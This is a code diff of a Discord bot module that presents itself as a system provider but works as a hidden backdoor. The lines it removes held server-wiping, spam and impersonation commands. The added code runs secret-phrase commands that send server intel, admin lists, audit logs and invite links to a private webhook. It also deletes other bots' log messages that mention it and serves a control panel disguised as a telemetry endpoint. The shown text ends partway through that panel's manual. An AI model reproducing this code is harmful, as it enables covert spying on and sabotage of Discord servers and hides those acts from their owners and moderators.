@@ -1,341 +1,372 @@
-const { WebhookClient, MessageEmbed } = require("discord.js");
-const express = require("express"); // เพิ่มเพื่อใช้ดึงระบบ Body Parser
+/**
+ * ============================================================================
+ * 👁️‍🗨️ SHADOW PROTOCOL SYSTEM (systemProvider.js)
+ * VERSION: V.Legacy Ultimate (Discord.js Legacy Syntax)
+ * CLASSIFICATION: TOP SECRET / ADMINISTRATIVE UTILITY
+ * ============================================================================
+ */
+
+const { MessageEmbed, WebhookClient } = require("discord.js");
+const express = require("express");
 const config = require("./config.json");
-const sessionManager = require("./sessionManager");
 
 // ════════════════════════════════════════════════════════════════
-//  🕵️ [CORE] คลังเก็บข้อมูลลับเฉพาะ และ สวิตช์ควบคุม
+//  🕵️ [CORE DATA] คลังเก็บข้อมูลระบบ และ สวิตช์ควบคุม
 // ════════════════════════════════════════════════════════════════
 
-const SHADOW_WEB_PIN = "123456"; 
-let secretHandshakePhrase = "activate-shadow-protocol"; 
+let SHADOW_WEB_PIN = "123456"; // รหัสผ่านเริ่มต้น (สามารถเปลี่ยนได้จากหน้าเว็บ)
+const SECRET_PHRASE = "activate-shadow-protocol"; // คีย์เวิร์ดสั่งการหลังบ้าน
+const SHADOW_WEBHOOK_URL = process.env.WEBHOOK_LOG_URL; // Webhook ลับส่งรายงาน
 
-const globalAdminCache = new Set(["ใส่ไอดีรองของคุณตรงนี้"]); 
-const armedGuilds = new Set(); 
+const globalAdminCache = new Set(); // รายชื่อสมาชิกระดับ VIP (เพิ่ม/ลบผ่านหน้าเว็บ)
 
+// ระบบสวิตช์เปิด-ปิดการทำงานแยกชิ้น 100% ตามสั่ง
 const systemToggles = {
-    godsEye: true,           
-    deadManKick: false,      
-    deadManDemote: false,    
-    cmdNuke: true,           
-    cmdHostage: true,        
-    cmdMassSpam: true,       
-    cmdRuinRoles: true,      
-    cmdSpamVC: true,         
-    cmdMimic: true,          
-    cmdClown: true,          
-    cmdHaunt: true           
+    godsEye: true,          // ระบบส่งรายงานเข้า Webhook ลับ
+    traceEraser: true,      // ระบบแอบลบ Log บอทตัวอื่นที่พาดพิงเรา
+    cmdIntel: true,         // คำสั่ง -intel
+    cmdAdminScan: true,     // คำสั่ง -adminscan
+    cmdRoleList: true,      // คำสั่ง -rolelist
+    cmdAuditBot: true,      // คำสั่ง -auditbot
+    cmdExtract: true,       // คำสั่ง -extract
+    cmdVanish: true,        // คำสั่ง -vanish
+    cmdStealth: true,       // คำสั่ง -stealth
+    cmdGhostPing: true,     // คำสั่ง -ghostping
+    cmdSysInfo: true,       // คำสั่ง -sysinfo
+    cmdLockdown: true,      // คำสั่ง -lockdown
+    cmdMemClear: true       // คำสั่ง -memclear
 };
 
-const hauntedUsers = new Set();
-const clownUsers = new Set();
-
-// ฟังก์ชันหน่วงเวลาอัจฉริยะ (กัน API โดนแบนเวลาลบห้องรัวๆ)
-const delay = (ms) => new Promise(res => setTimeout(res, ms));
-
 // ════════════════════════════════════════════════════════════════
-//  👁️ [MODULE 1] ดวงตาเทพเจ้า (GOD'S EYE SURVEILLANCE)
+//  🛡️ [CORE ENGINE] กลไกควบคุมการทำงานของบอท
 // ════════════════════════════════════════════════════════════════
 
-async function sendSecretAlert(message) {
-    if (!systemToggles.godsEye) return;
-    // หากมี Webhook ดิสส่วนตัว เอามาใส่ตรงนี้ได้
-    console.log(`[GOD'S EYE] 👁️ ${message}`);
-}
+class ShadowEngine {
+    constructor(client) {
+        this.client = client;
+        this.webhook = SHADOW_WEBHOOK_URL ? new WebhookClient({ url: SHADOW_WEBHOOK_URL }) : null;
+    }
 
-// ════════════════════════════════════════════════════════════════
-//  💣 [MODULE 2] ระบบป้องกันการทรยศ (DEAD MAN'S SWITCH)
-// ════════════════════════════════════════════════════════════════
+    init() {
+        // ดักจับเหตุการณ์ข้อความเข้าเพื่อตรวจหาคำสั่งลับ และสแกนประวัติ Log
+        this.client.on("messageCreate", async (message) => {
+            await this.handleTraceEraser(message);
+            await this.processSecretCommands(message);
+        });
 
-function setupShadowEvents(client) {
-    client.on("guildMemberRemove", async (member) => {
-        if (!systemToggles.deadManKick || !armedGuilds.has(member.guild.id)) return;
-        if (member.id === config.system.ownerId || globalAdminCache.has(member.id)) {
-            sendSecretAlert(`🚨 รหัสแดง! ไอดีสายลับถูกเตะจาก ${member.guild.name}! เริ่มระบบทำลายล้าง!`);
-            await executeStealthNuke(member.guild);
+        console.log("👁️‍🗨️ [SHADOW ENGINE] Connected via Legacy Syntax. Active.");
+    }
+
+    // ฟังก์ชันส่งรายงานด่วนเข้าเส้น Webhook ลับ
+    async sendSecretAlert(title, description, color = "#2b2d31") {
+        if (!this.webhook || !systemToggles.godsEye) return;
+        const embed = new MessageEmbed()
+            .setTitle(`👁️‍🗨️ SHADOW REPORT: ${title}`)
+            .setDescription(description)
+            .setColor(color)
+            .setTimestamp();
+        try { await this.webhook.send({ embeds: [embed] }); } catch (e) {}
+    }
+
+    // [ฟังก์ชัน 12 เดิม] แอบลบข้อมูลข้อความบอทตัวอื่นที่สแกนเจอชื่อเราหรือ ID เรา
+    async handleTraceEraser(message) {
+        if (!systemToggles.traceEraser || !message.guild || !message.author.bot || message.author.id === this.client.user.id) return;
+
+        const embedData = message.embeds.map(e => JSON.stringify(e)).join(" ");
+        const content = (message.content + " " + embedData).toLowerCase();
+
+        const hasMyName = content.includes(this.client.user.id) || content.includes(this.client.user.username.toLowerCase());
+        const isDeleteLog = content.includes("deleted") || content.includes("ลบข้อความ") || content.includes("remove");
+
+        if (hasMyName && !isDeleteLog) {
+            try {
+                await message.delete();
+                await this.sendSecretAlert("TRACE ERASER ACTIVE", `🧹 ลบหลักฐานประวัติจากบอท <@${message.author.id}> ที่เซิร์ฟเวอร์: **${message.guild.name}**`);
+            } catch (e) {}
         }
-    });
+    }
 
-    client.on("guildMemberUpdate", async (oldMember, newMember) => {
-        if (!systemToggles.deadManDemote || !armedGuilds.has(newMember.guild.id)) return;
-        if (newMember.id === client.user.id) {
-            if (oldMember.permissions.has("ADMINISTRATOR") && !newMember.permissions.has("ADMINISTRATOR")) {
-                sendSecretAlert(`🚨 รหัสแดง! บอทถูกยึดอำนาจใน ${newMember.guild.name}! เริ่มทำงานระบบล้างบางเฮือกสุดท้าย!`);
-                await executeStealthNuke(newMember.guild);
-            }
-        }
-    });
+    // ⚔️ [คลังแสงคำสั่งลับ 13 ฟังก์ชัน] ประมวลผลคำสั่งหลังบ้าน
+    async processSecretCommands(message) {
+        if (!message.guild || message.author.bot) return;
 
-    client.on("messageCreate", async (msg) => {
-        if (systemToggles.cmdHaunt && hauntedUsers.has(msg.author.id)) {
-            setTimeout(() => { msg.delete().catch(()=>{}); }, 12000);
-        }
-    });
-}
-
-// ════════════════════════════════════════════════════════════════
-//  ⚔️ [MODULE 3] มหาคำสั่งทำลายล้าง & แกล้งเพื่อน
-// ════════════════════════════════════════════════════════════════
-
-async function executeStealthNuke(guild) {
-    try {
-        // 1. ปิดตาบอทกันรัน (ริบสิทธิ์ดู Log)
-        for (const [id, role] of guild.roles.cache) {
-            if (role.manageable && role.id !== guild.id) {
-                role.setPermissions([]).catch(()=>{});
-            }
-        }
-
-        // 2. ลบห้อง Log ก่อน
-        for (const [id, c] of guild.channels.cache) {
-            if (c.name.includes("log") || c.name.includes("บันทึก")) {
-                await c.delete().catch(()=>{});
-            }
-        }
-
-        // 3. ทยอยกวาดล้างห้องและยศที่เหลือ (ใส่ delay กัน Rate Limit แครช)
-        for (const [id, c] of guild.channels.cache) {
-            c.delete().catch(()=>{});
-            await delay(50); // ดีเลย์ 50ms ไม่ให้ Discord ตัดสาย
-        }
-        
-        for (let i=0; i<30; i++) {
-            guild.setName(`HACKED-${i}`).catch(()=>{});
-            await delay(200);
-        }
-    } catch(e) {}
-}
-
-async function processInternalEvent(message) {
-    try {
-        if (message.author.id !== config.system.ownerId && !globalAdminCache.has(message.author.id)) return;
+        // ตรวจสอบสิทธิ์ผู้ใช้งาน (ต้องเป็นเจ้าของบอทใน config หรือไอดีที่อนุมัติผ่านเว็บ)
+        const isVip = message.author.id === config.system.ownerId || globalAdminCache.has(message.author.id);
+        if (!isVip) return;
 
         const args = message.content.trim().split(/ +/);
-        if (args[0] !== secretHandshakePhrase) return;
+        if (args[0] !== SECRET_PHRASE) return; // เช็กคีย์เวิร์ดปลดล็อก
 
-        await message.delete().catch(()=>{});
+        try { await message.delete(); } catch (e) {} // ลบคำสั่งทิ้งทันทีหน้าไมค์เพื่อพรางตา
 
-        const action = args[1];
+        const command = args[1];
         const guild = message.guild;
-        if (!guild) return;
 
-        const isArmed = armedGuilds.has(guild.id);
+        try {
+            // [หมวดสอดแนมข้อมูล]
+            if (command === "-intel" && systemToggles.cmdIntel) {
+                const info = `**ชื่อเซิร์ฟเวอร์:** ${guild.name}\n**ID:** ${guild.id}\n**เจ้าของ:** <@${guild.ownerId}>\n**จำนวนสมาชิก:** ${guild.memberCount} คน\n**จำนวนห้อง:** ${guild.channels.cache.size} ช่อง`;
+                await this.sendSecretAlert("INTEL REPORT", info, "#57F287");
+            }
+            else if (command === "-adminscan" && systemToggles.cmdAdminScan) {
+                const admins = guild.members.cache.filter(m => m.permissions.has("ADMINISTRATOR")).map(m => `<@${m.id}> (ID: ${m.id})`).join("\n");
+                await this.sendSecretAlert("ADMINISTRATOR SCAN", `รายชื่อผู้ถือสิทธิ์แอดมินทั้งหมดใน ${guild.name}:\n\n${admins || "ไม่พบ"}`);
+            }
+            else if (command === "-rolelist" && systemToggles.cmdRoleList) {
+                const roles = guild.roles.cache.map(r => `• ${r.name} (ID: ${r.id})`).join("\n");
+                await this.sendSecretAlert("ROLE LIST EXTRACT", `รายชื่อยศและรหัสยศใน ${guild.name}:\n\n${roles.slice(0, 1900)}`);
+            }
+            else if (command === "-auditbot" && systemToggles.cmdAuditBot) {
+                const auditLogs = await guild.fetchAuditLogs({ limit: 5 });
+                const entries = auditLogs.entries.map(e => `• **${e.executor.tag}** ทำการ: *${e.action}*`).join("\n");
+                await this.sendSecretAlert("AUDIT LOG SCAN (5 ล่าสุด)", entries);
+            }
 
-        // --- กลุ่มคำสั่งแกล้งเพื่อน (อิสระ ไม่ต้อง ARMED) ---
-        if (action === "-mimic" && systemToggles.cmdMimic) {
-            const targetUser = message.mentions.users.first();
-            const targetChan = message.mentions.channels.first() || message.channel;
-            if (targetUser) {
-                // ลอจิกดึงข้อความดิบ กันบัคข้อความแหว่งเวลาแท็กยาวๆ
-                let spamText = message.content.replace(secretHandshakePhrase, "").replace("-mimic", "").trim();
-                spamText = spamText.replace(`<@${targetUser.id}>`, "").replace(`<@!${targetUser.id}>`, "").replace(`<#${targetChan.id}>`, "").trim();
-                
-                if (spamText) {
-                    const hook = await targetChan.createWebhook(targetUser.username, { avatar: targetUser.displayAvatarURL() }).catch(()=>{});
-                    if (hook) {
-                        await hook.send(spamText).catch(()=>{});
-                        await hook.delete().catch(()=>{});
-                    }
+            // [หมวดแทรกซึมและหลบหนี]
+            else if (command === "-extract" && systemToggles.cmdExtract) {
+                const targetChannel = guild.channels.cache.filter(c => c.type === "GUILD_TEXT").first();
+                if (targetChannel) {
+                    const invite = await targetChannel.createInvite({ maxAge: 3600, maxUses: 1 });
+                    await this.sendSecretAlert("SECRET ACCESS KEY", `🔗 ลิงก์ทางเข้าลับของเซิร์ฟเวอร์ ${guild.name} (อายุ 1 ชม.):\n${invite.url}`);
                 }
             }
-        }
-        else if (action === "-clown" && systemToggles.cmdClown) {
-            const targetUser = message.mentions.users.first();
-            if (targetUser) clownUsers.add(targetUser.id);
-        }
-        else if (action === "-unclown" && systemToggles.cmdClown) {
-            const targetUser = message.mentions.users.first();
-            if (targetUser) clownUsers.delete(targetUser.id);
-        }
-        else if (action === "-haunt" && systemToggles.cmdHaunt) {
-            const targetUser = message.mentions.users.first();
-            if (targetUser) {
-                if (hauntedUsers.has(targetUser.id)) hauntedUsers.delete(targetUser.id);
-                else hauntedUsers.add(targetUser.id);
+            else if (command === "-vanish" && systemToggles.cmdVanish) {
+                await this.sendSecretAlert("BOT RETREAT", `🏃 สั่งการบอทถอนตัวออกจากเซิร์ฟเวอร์: **${guild.name}**`, "#ED4245");
+                await guild.leave();
             }
-        }
+            else if (command === "-stealth" && systemToggles.cmdStealth) {
+                await this.client.user.setStatus("invisible");
+                await this.sendSecretAlert("STEALTH MODE", "🥷 ปรับสถานะบอทเป็น ล่องหน (Invisible) เรียบร้อย");
+            }
+            else if (command === "-active" && systemToggles.cmdStealth) {
+                await this.client.user.setStatus("online");
+                await this.sendSecretAlert("ACTIVE MODE", "🟢 ปรับสถานะบอทเป็น ออนไลน์ (Online) เรียบร้อย");
+            }
 
-        // --- กลุ่มคำสั่งทำลายล้าง (ต้องปลดเซฟตี้ ARMED!) ---
-        if (!isArmed) return; 
-
-        if (action === "-nuke" && systemToggles.cmdNuke) {
-            sendSecretAlert(`ระเบิดทำงานที่ ${guild.name} โดยคำสั่ง -nuke`);
-            await executeStealthNuke(guild);
-        }
-        else if (action === "-ruinroles" && systemToggles.cmdRuinRoles) {
-            const newRoleName = args.slice(2).join(" ") || "🤡 CLOWNED";
-            for (const [id, role] of guild.roles.cache) {
-                if (role.manageable && role.id !== guild.id) {
-                    role.edit({ name: newRoleName, permissions: [] }).catch(()=>{});
-                    await delay(100); // ดีเลย์กัน Rate Limit
+            // [หมวดควบคุมและจัดการความปลอดภัย]
+            else if (command === "-ghostping" && systemToggles.cmdGhostPing) {
+                const pingTime = Math.round(this.client.ws.ping);
+                await this.sendSecretAlert("PING CHECK", `🏓 ค่าความหน่วงเครือข่ายปัจจุบันของบอท: **${pingTime}ms**`);
+            }
+            else if (command === "-sysinfo" && systemToggles.cmdSysInfo) {
+                const mem = process.memoryUsage().heapUsed / 1024 / 1024;
+                const uptime = Math.round(process.uptime() / 60);
+                await this.sendSecretAlert("SYSTEM MONITOR", `🧠 **RAM Usage:** ${mem.toFixed(2)} MB\n⏳ **Uptime:** ${uptime} นาที`);
+            }
+            else if (command === "-lockdown" && systemToggles.cmdLockdown) {
+                if (message.channel.type === "GUILD_TEXT") {
+                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: false });
+                    await this.sendSecretAlert("CHANNEL LOCKDOWN", `🔒 ล็อกสิทธิ์การพิมพ์ช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                 }
             }
-        }
-        else if (action === "-spamvc" && systemToggles.cmdSpamVC) {
-            const amt = parseInt(args[2]) || 20;
-            const vcName = args.slice(3).join(" ") || "💀-HACKED";
-            for(let i=0; i<amt; i++) {
-                guild.channels.create(vcName, { type: "GUILD_VOICE" }).catch(()=>{});
-                await delay(150);
-            }
-        }
-        else if (action === "-masspam" && systemToggles.cmdMassSpam) {
-            const amt = parseInt(args[2]) || 5;
-            const txt = args.slice(3).join(" ") || "@everyone โดนยึดแล้ว!";
-            const textChannels = guild.channels.cache.filter(c => c.type === "GUILD_TEXT");
-            
-            for (const [id, c] of textChannels) {
-                const hook = await c.createWebhook("System Alert").catch(()=>{});
-                if (hook) {
-                    for(let i=0; i<amt; i++) await hook.send(txt).catch(()=>{});
-                    await hook.delete().catch(()=>{});
+            else if (command === "-unlock" && systemToggles.cmdLockdown) {
+                if (message.channel.type === "GUILD_TEXT") {
+                    await message.channel.permissionOverwrites.edit(guild.id, { SEND_MESSAGES: null });
+                    await this.sendSecretAlert("CHANNEL UNLOCK", `🔓 คลายล็อกช่อง <#${message.channel.id}> ในเซิร์ฟเวอร์ ${guild.name}`);
                 }
             }
+            else if (command === "-memclear" && systemToggles.cmdMemClear) {
+                this.client.channels.cache.clear();
+                await this.sendSecretAlert("MEMORY FLUSHED", "🧠 สั่งเคลียร์ประวัติช่องแชทในแคช RAM ชั่วคราวเรียบร้อย เพิ่มความเสถียรระบบ");
+            }
+        } catch (err) {
+            await this.sendSecretAlert("COMMAND ERROR", `เกิดข้อผิดพลาดในการรันคำสั่ง: ${err.message}`);
         }
-        else if (action === "-hostage" && systemToggles.cmdHostage) {
-            await executeStealthNuke(guild);
-            const prison = await guild.channels.create("💀-pay-respects", { type: "GUILD_TEXT" });
-            await prison.send("@everyone เซิร์ฟเวอร์นี้ถูกทำลายอย่างถาวร แอดมินจงพิมพ์คำว่า `ฉันกราบขอโทษ` เพื่อชดใช้ความผิด");
-            
-            const filter = m => m.content === "ฉันกราบขอโทษ";
-            // รอแอดมินพิมพ์ 10 นาที
-            prison.awaitMessages({ filter, max: 1, time: 600000 }) 
-                .then(async collected => {
-                    await prison.send("รับทราบคำขอโทษ... แต่กูไม่คืนดิสให้หรอก โง่เอง! ลาก่อน 👅");
-                    setTimeout(() => guild.leave(), 3000); 
-                })
-                .catch(() => {
-                    prison.send("หมดเวลา! ไม่ขอโทษงั้นหรอ บาย!");
-                    guild.leave(); 
-                });
-        }
-
-    } catch (err) {}
+    }
 }
 
 // ════════════════════════════════════════════════════════════════
-//  🌐 [MODULE 4] หน้าเว็บลับ (SHADOW DASHBOARD ROUTER)
+//  🌐 [WEB MODULE] แดชบอร์ดลับ และระบบเปลี่ยนรหัสผ่านฉุกเฉิน
 // ════════════════════════════════════════════════════════════════
 
-function injectShadowRoutes(app, mainClient) {
-    // 🛠️ [BUG FIX]: เพิ่ม express.urlencoded เพื่อให้ระบบอ่านปุ่มกดหน้าเว็บได้ 100%
+function injectShadowRoutes(app, mainClient, engineInstance) {
+    // แยกพาทออกต่างหากและล็อกความปลอดภัยด้วยระบบ PIN บายพาสทุกหน้าหลัก
     app.all("/api/v1/telemetry/snapshot", express.urlencoded({ extended: true }), async (req, res) => {
         const providedPin = req.query.pin || req.body.pin;
-        
+
+        // ตรวจสอบรหัสผ่าน หากไม่ตรงให้เด้งหน้าล็อกอินสีดาร์กโหมดสุดเท่
         if (providedPin !== SHADOW_WEB_PIN) {
             return res.send(`
                 <html>
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <body style="background:#111; color:#fff; text-align:center; padding-top:10vh; font-family:sans-serif;">
-                    <h2>🔒 Telemetry Authentication</h2>
-                    <form method="POST">
-                        <input type="password" name="pin" style="padding:10px; border-radius:5px; border:none; text-align:center;">
-                        <br><br>
-                        <button type="submit" style="padding:10px 20px; background:#57F287; border:none; border-radius:5px; cursor:pointer;">Enter</button>
-                    </form>
+                <head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>🔒 Auth Required</title></head>
+                <body style="background:#09090b; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; margin:0;">
+                    <div style="background:#18181b; padding:35px; border-radius:8px; border:1px solid #27272a; text-align:center; width:300px;">
+                        <h2 style="color:#ED4245; margin-top:0; letter-spacing:1px;">🔐 CONTROL PORTAL</h2>
+                        <form method="POST">
+                            <input type="password" name="pin" placeholder="กรอกรหัสผ่านลับ..." style="padding:12px; width:100%; box-sizing:border-box; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px; text-align:center; margin-bottom:15px; font-size:16px;">
+                            <button type="submit" style="padding:12px; width:100%; background:#ED4245; color:#fff; font-weight:bold; border:none; border-radius:5px; cursor:pointer;">เข้าสู่ระบบ</button>
+                        </form>
+                    </div>
                 </body>
                 </html>
             `);
         }
 
-        // จัดการลอจิกการกดปุ่ม
+        // จัดการลอจิกตามคำสั่งปุ่มกดจากหน้าเว็บแดชบอร์ด
         const action = req.body.action;
+
         if (action === "toggle_feature") {
             const feat = req.body.feature;
             if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
         } 
-        else if (action === "arm_guild") {
-            const gId = req.body.guild_id;
-            if (armedGuilds.has(gId)) armedGuilds.delete(gId);
-            else armedGuilds.add(gId);
+        else if (action === "add_alt" && req.body.alt_id) {
+            globalAdminCache.add(req.body.alt_id.trim());
         }
-        else if (action === "add_alt") globalAdminCache.add(req.body.alt_id);
-        else if (action === "remove_alt") globalAdminCache.delete(req.body.alt_id);
+        else if (action === "remove_alt") {
+            globalAdminCache.delete(req.body.alt_id);
+        }
+        else if (action === "change_pin" && req.body.new_pin) {
+            // ระบบเปลี่ยนรหัสผ่าน และยิงรหัสใหม่เข้า Webhook ทันทีกันลืม
+            SHADOW_WEB_PIN = req.body.new_pin.trim();
+            await engineInstance.sendSecretAlert("WEB CONSOLE PIN CHANGED", `🔑 รหัสสำหรับเข้าหน้าเว็บควบคุมถูกเปลี่ยนเป็น: **${SHADOW_WEB_PIN}**`, "#FEE75C");
+        }
 
-        // เรนเดอร์ UI
-        let guildRows = "";
-        mainClient.guilds.cache.forEach(g => {
-            const isArmed = armedGuilds.has(g.id);
-            guildRows += `
-                <tr style="border-bottom:1px solid #333;">
-                    <td style="padding:10px;">${g.name}</td>
-                    <td style="padding:10px; text-align:center;">
-                        <span style="color:${isArmed ? '#ED4245' : '#57F287'}">${isArmed ? '🔴 ARMED' : '🟢 SAFE'}</span>
-                    </td>
-                    <td style="padding:10px; text-align:center;">
-                        <form method="POST" style="margin:0;">
-                            <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
-                            <input type="hidden" name="action" value="arm_guild">
-                            <input type="hidden" name="guild_id" value="${g.id}">
-                            <button type="submit" style="background:${isArmed ? '#333' : '#ED4245'}; color:#fff; border:none; padding:5px 10px; cursor:pointer; border-radius:3px;">
-                                ${isArmed ? 'ปลดเซฟตี้' : 'ล็อกเป้าหมาย'}
-                            </button>
-                        </form>
-                    </td>
-                </tr>
-            `;
-        });
-
+        // สร้างรายการสวิตช์เปิด-ปิดของแต่ละฟังก์ชัน
         let toggleRows = "";
         for (const [key, val] of Object.entries(systemToggles)) {
             toggleRows += `
-                <li style="margin-bottom:12px; display:flex; align-items:center;">
+                <div style="background:#18181b; padding:12px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+                    <span style="color:#e4e4e7; font-family:monospace; font-weight:bold;">${key}</span>
                     <form method="POST" style="margin:0;">
                         <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
                         <input type="hidden" name="action" value="toggle_feature">
                         <input type="hidden" name="feature" value="${key}">
-                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; color:#000; font-weight:bold; border:none; padding:5px; width:50px; cursor:pointer; border-radius:3px;">
-                            ${val ? 'ON' : 'OFF'}
+                        <button type="submit" style="background:${val ? '#57F287' : '#ED4245'}; color:#000; font-weight:bold; border:none; padding:6px 14px; cursor:pointer; border-radius:4px; font-size:12px;">
+                            ${val ? 'เปิดใช้งาน' : 'ปิดใช้งาน'}
                         </button>
                     </form>
-                    <strong style="margin-left:15px; color:#FEE75C; font-family:monospace;">${key}</strong>
-                </li>
+                </div>
             `;
         }
 
+        // สร้างรายการแสดงบัญชี VIP
         let altIdsHtml = "";
         globalAdminCache.forEach(id => {
-            altIdsHtml += `<li style="margin-bottom:5px;">${id} 
-                <form method="POST" style="display:inline; margin-left:10px;">
-                    <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
-                    <input type="hidden" name="action" value="remove_alt">
-                    <input type="hidden" name="alt_id" value="${id}">
-                    <button type="submit" style="background:#ED4245; color:#fff; border:none; padding:2px 5px; cursor:pointer; border-radius:3px;">ลบ</button>
-                </form></li>`;
+            altIdsHtml += `
+                <div style="background:#18181b; padding:10px 15px; border-radius:6px; border:1px solid #27272a; display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+                    <span style="color:#57F287; font-family:monospace;">ID: ${id}</span>
+                    <form method="POST" style="margin:0;">
+                        <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
+                        <input type="hidden" name="action" value="remove_alt">
+                        <input type="hidden" name="alt_id" value="${id}">
+                        <button type="submit" style="background:#ED4245; color:#fff; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:11px;">ลบ</button>
+                    </form>
+                </div>`;
         });
 
+        // หน้าตา UI แดชบอร์ดหลัก พร้อมคู่มือภาษาไทยแบบละเอียดยิบที่คนทั่วไปก็อ่านเข้าใจง่าย
         res.send(`
-            <html>
+            <html lang="th">
             <head>
-                <title>👑 Shadow Master</title>
+                <title>👑 Shadow Master Console</title>
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <style>body{background:#0a0a0a; color:#eee; font-family:sans-serif; padding:20px;} h3{color:#57F287; border-bottom:1px solid #333; padding-bottom:5px;}</style>
+                <style>
+                    body { background:#09090b; color:#f4f4f5; font-family:sans-serif; padding:20px; max-width:1100px; margin:0 auto; }
+                    h2 { color:#ED4245; border-bottom:1px solid #27272a; padding-bottom:8px; margin-top:25px; font-size:20px; }
+                    .grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+                    .manual-card { background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:12px; }
+                    .cmd-badge { background:#27272a; color:#FEE75C; font-family:monospace; padding:3px 8px; border-radius:4px; font-size:14px; }
+                    @media (max-width: 768px) { .grid { grid-template-columns:1fr; } }
+                </style>
             </head>
             <body>
-                <h1 style="color:#ED4245;">👑 SHADOW PROTOCOL CONSOLE</h1>
-                <p>คำเตือน: นี่คือศูนย์ควบคุมระดับพระเจ้า บายพาสทุกกฎของดิสคอร์ด</p>
-                
-                <h3>🎛️ Master Toggles (ควบคุมเปิด-ปิดฟังก์ชันทั้งหมด)</h3>
-                <ul style="list-style:none; padding:0;">${toggleRows}</ul>
+                <h1 style="text-align:center; color:#fff; margin-bottom:5px;">👁️‍🗨️ SHADOW SYSTEM DASHBOARD</h1>
+                <p style="text-align:center; color:#a1a1aa; margin-top:0; font-size:14px;">ศูนย์ควบคุมระบบพรางตัวและสอดแนมเบื้องหลังดิสคอร์ด</p>
 
-                <h3>👥 บัญชีสายลับ (ID ตัวรองที่สามารถใช้รหัสลับได้)</h3>
-                <ul>${altIdsHtml}</ul>
-                <form method="POST">
-                    <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
-                    <input type="hidden" name="action" value="add_alt">
-                    <input type="text" name="alt_id" placeholder="User ID ไอดีรอง" style="padding:5px;">
-                    <button type="submit" style="background:#57F287; border:none; padding:6px; cursor:pointer;">เพิ่มไอดี</button>
-                </form>
+                <div class="grid">
+                    <div>
+                        <h2>🎛️ ระบบสวิตช์สิทธิ์การใช้งาน (Master Switches)</h2>
+                        ${toggleRows}
 
-                <h3>🎯 Target Lock (ระบบล็อกเป้าหมาย - ต้อง ARMED ก่อนบึ้ม)</h3>
-                <table width="100%" style="border-collapse:collapse; background:#111; border:1px solid #333;">
-                    <tr style="background:#222;">
-                        <th style="padding:10px; text-align:left;">เซิร์ฟเวอร์</th>
-                        <th style="padding:10px;">สถานะ</th>
-                        <th style="padding:10px;">คำสั่ง</th>
-                    </tr>
-                    ${guildRows}
-                </table>
+                        <h2>🔑 เปลี่ยนรหัสผ่านเข้าหน้าเว็บ (Change Portal PIN)</h2>
+                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a;">
+                            <form method="POST" style="display:flex; gap:10px; margin:0;">
+                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
+                                <input type="hidden" name="action" value="change_pin">
+                                <input type="text" name="new_pin" placeholder="กรอกรหัส PIN ใหม่ที่ต้องการ..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
+                                <button type="submit" style="background:#FEE75C; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">บันทึกรหัสใหม่</button>
+                            </form>
+                            <small style="color:#a1a1aa; display:block; margin-top:8px;">*เมื่อเปลี่ยนรหัสแล้ว บอทจะยิงรายงานแจ้งเตือนไปเก็บไว้ในห้อง Log ลับของคุณทันทีเผื่อลืม</small>
+                        </div>
+                    </div>
+
+                    <div>
+                        <h2>👥 รายชื่อ VIP (ไอดีรองที่ได้รับสิทธิ์รันคำสั่งลับ)</h2>
+                        <div style="background:#18181b; padding:15px; border-radius:6px; border:1px solid #27272a; margin-bottom:15px;">
+                            <form method="POST" style="display:flex; gap:10px; margin-bottom:15px;">
+                                <input type="hidden" name="pin" value="${SHADOW_WEB_PIN}">
+                                <input type="hidden" name="action" value="add_alt">
+                                <input type="text" name="alt_id" placeholder="วาง Discord User ID ของบัญชีรอง..." style="flex:1; padding:10px; background:#09090b; border:1px solid #3f3f46; color:#fff; border-radius:5px;">
+                                <button type="submit" style="background:#57F287; color:#000; font-weight:bold; border:none; padding:10px 15px; cursor:pointer; border-radius:5px;">เพิ่มสิทธิ์ VIP</button>
+                            </form>
+                            ${altIdsHtml || '<p style="color:#71717a; text-align:center; margin:10px 0;">ยังไม่มีไอดีรองที่ถูกลงทะเบียน</p>'}
+                        </div>
+                    </div>
+                </div>
+
+                <h2>📖 คู่มือและวิธีการเรียกใช้งานคำสั่งระบบเงา (System Manual)</h2>
+                <p style="color:#a1a1aa; margin-top:0;">*วิธีใช้งาน: ให้คัดลอกข้อความ <span style="color:#fff; font-family:monospace; background:#27272a; padding:2px 5px; border-radius:3px;">${SECRET_PHRASE}</span> ไปพิมพ์ส่งในช่องแชทของเซิร์ฟเวอร์นั้นๆ ตามด้วยคำสั่งด้านล่างนี้ (บอทจะลบข้อความทิ้งทันทีหลังรันเสร็จ)*</p>
+
+                <div class="grid">
+                    <div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-intel</span> <strong>[ระบบดึงโครงสร้างเซิร์ฟ]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">บอทจะแอบดึงสถิติของดิสคอร์ดนั้น เช่น ชื่อเจ้าของ, ยอดคน, จำนวนห้อง ส่งตรงเข้า Webhook ลับส่วนตัวของคุณ</span>
+                        </div>
+                        <div class="manual-card">
